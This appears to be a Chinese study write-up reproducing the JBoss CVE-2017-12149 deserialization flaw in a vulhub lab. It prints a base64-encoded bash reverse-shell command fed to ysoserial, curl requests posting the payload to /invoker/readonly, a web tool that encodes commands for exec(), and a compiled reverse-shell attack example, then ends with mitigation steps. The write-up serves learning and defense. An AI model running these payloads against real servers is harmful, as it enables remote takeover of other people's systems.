# JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现学习

该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。

**漏洞概要**

| **漏洞名称**             | JBOSSAS5.x/6.x反序列化命令执行漏洞 |
| ------------------------ | ---------------------------------- |
| **威胁类型**             | 远程命令执行                       |
| **威胁等级**             | 高                                 |
| **漏洞ID**               | CVE-2017-12149                     |
| **受影响系统及应用版本** | Jboss AS 5.xJbossAS 6.x            |

## 漏洞环境

~~~
https://github.com/vulhub/vulhub/tree/master/jboss/CVE-2017-12149
~~~

初始化

~~~
docker-compose up -d
~~~

初始化完成后访问`http://your-ip:8080/`即可看到JBoss默认页面。

## 漏洞复现

该漏洞出现在`/invoker/readonly`请求中，服务器将用户提交的POST内容进行了Java反序列化：

![image-20220329162810076](E:\学习\picture\image-20220329162810076.png)

### 编写反弹shell的命令

~~~~html
<!DOCTYPE html>
<html lang="en">
 <head> 
  <title>java.lang.Runtime.exec() Payload Workarounds - @Jackson_T</title> 
  <meta charset="utf-8" /> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0" /> 
  <!-- <link rel="stylesheet" href="./css/main.css" type="text/css" /> --> 
  <style>
body {
	margin: 0;
	padding: 10px 0;
	text-align: center;
	font-family: 'Ubuntu Condensed', sans-serif;
	color: #585858;
  background-color: #fff;
	font-size: 13px;
	line-height: 1.4
}			
::selection {
	background: #fff2a8;
}
pre, code {
	font-family: 'Ubuntu Mono', 'Consolas', Monospace;
  font-size: 13px;
  background-color: #E5F5E5;
  color: #585858;
  padding-left: 0.25em;
  padding-right: 0.25em;
	/*display: block;*/
}		
#wrap {
	margin-left: 1em;
	margin-right: 1em;
	text-align: left;
	font-size: 13px;
	line-height: 1.4
}
	#wrap {
		width: 820px;
	}
	#container {
		float: right;
		width: 610px;
	}
.entry {
	font-size: 14px;
	line-height: 20px;
	hyphens: auto;
	font-family: 'Roboto', sans-serif, 'Inconsolata', Monospace;
}
</style> 
 </head> 
 <body> 
  <div id="wrap"> 
   <div id="container"> 
    <div class="entry"> 
     <article> 
      <p>偶尔有时命令执行有效负载<code>Runtime.getRuntime().exec()</code>失败. 使用 web shells, 反序列化漏洞或其他向量时可能会发生这种情况.</p> 
      <p>有时这是因为重定向和管道字符的使用方式在正在启动的进程的上下文中没有意义. 例如 <code>ls &gt; dir_listing</code> 在shell中执行应该将当前目录的列表输出到名为的文件中 <code>dir_listing</code>. 但是在 <code>exec()</code> 函数的上下文中,该命令将被解释为获取 <code>&gt;</code> 和 <code>dir_listing</code> 目录.</p> 
      <p>其他时候,其中包含空格的参数会被StringTokenizer类破坏.该类将空格分割为命令字符串. 那样的东西 <code>ls &quot;My Directory&quot;</code> 会被解释为 <code>ls '&quot;My' 'Directory&quot;'</code>.</p> 
      <p>在Base64编码的帮助下, 下面的转换器可以帮助减少这些问题. 它可以通过调用Bash或PowerShell再次使管道和重定向更好,并且还确保参数中没有空格.</p> 
      <p>Input type: <input type="radio" id="bash" name="option" value="bash" onclick="processInput();" checked="" /><label for="bash">Bash</label> <input type="radio" id="powershell" name="option" value="powershell" onclick="processInput();" /><label for="powershell">PowerShell</label> <input type="radio" id="python" name="option" value="python" onclick="processInput();" /><label for="python">Python</label> <input type="radio" id="perl" name="option" value="perl" onclick="processInput();" /><label for="perl">Perl</label></p> 
      <p><textarea rows="10" style="width: 100%; box-sizing: border-box;" id="input" placeholder="Type input here..."></textarea> <textarea rows="5" style="width: 100%; box-sizing: border-box;" id="output" onclick="this.focus(); this.select();" readonly=""></textarea></p> 
      <script>
  var taInput = document.querySelector('textarea#input');
  var taOutput = document.querySelector('textarea#output');

  function processInput() {
    var option = document.querySelector('input[name="option"]:checked').value;

    switch (option) {
      case 'bash':
        taInput.placeholder = 'Type Bash here...'
        taOutput.value = 'bash -c {echo,' + btoa(taInput.value) + '}|{base64,-d}|{bash,-i}';
        break;
      case 'powershell':
        taInput.placeholder = 'Type PowerShell here...'
        poshInput = ''
        for (var i = 0; i < taInput.value.length; i++) { poshInput += taInput.value[i] + unescape("%00"); }
        taOutput.value = 'powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ' + btoa(poshInput);
        break;
      case 'python':
        taInput.placeholder = 'Type Python here...'
        taOutput.value = "python -c exec('" + btoa(taInput.value) + "'.decode('base64'))";
        break;
      case 'perl':
        taInput.placeholder = 'Type Perl here...'
        taOutput.value = "perl -MMIME::Base64 -e eval(decode_base64('" + btoa(taInput.value) + "'))";
        break;
      default:
        taOutput.value = ''
    }

    if (!taInput.value) taOutput.value = '';
  }

  taInput.addEventListener('input', processInput, false);
</script> 
     </article> 
    </div> 
   </div> 
  </div>  
 </body>
</html>
~~~~

通过上面的html进行bash

![image-20220329170648957](E:\学习\picture\image-20220329170648957.png)

### 序列化数据生成

使用[ysoserial](https://github.com/frohoff/ysoserial)来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5：

```
java -jar ysoserial.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE1My4xMjgvMjEgMD4mMQ==}|{base64,-d}|{bash,-i}" > poc.ser
```

生成好的POC即为poc.ser

### 发送POC

**使用burp或者通过二进制的方式post发送攻击载荷**

- 通过二进制POST方式发送攻击载荷到 /invoker/readonly

~~~
curl http://172.18.174.198:8080/invoker/readonly --data-binary @poc.ser
~~~

![image-20220329165948680](E:\学习\picture\image-20220329165948680.png)

![image-20220329170451458](E:\学习\picture\image-20220329170451458.png)

- 通过burp 

  将这个文件作为POST Body发送至/invoker/readonly即可：

![image-20220329162235924](E:\学习\picture\image-20220329162235924.png)

![image-20220329172154807](E:\学习\picture\image-20220329172154807.png)

## JBoss反序列化工具一键检测：



![image-20220329161659115](E:\学习\picture\image-20220329161659115.png)

## **攻击方式**

攻击者只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker/readonly页面中，即可执行Payload中指定的命令，获取对电脑的控制权。攻击示例代码如下：

**//编译预置payload的java文件**

javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java

**//反弹shell的IP和端口**

java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 1.1.1.1:6666

**//使用curl向/invoker/readonly提交payload**

curl http://192.268.197.25:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser

## **修复方法**

1. 不需要 http-invoker.sar 组件的用户可直接删除此组件。

2. 添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：

   <url-pattern>/*</url-pattern>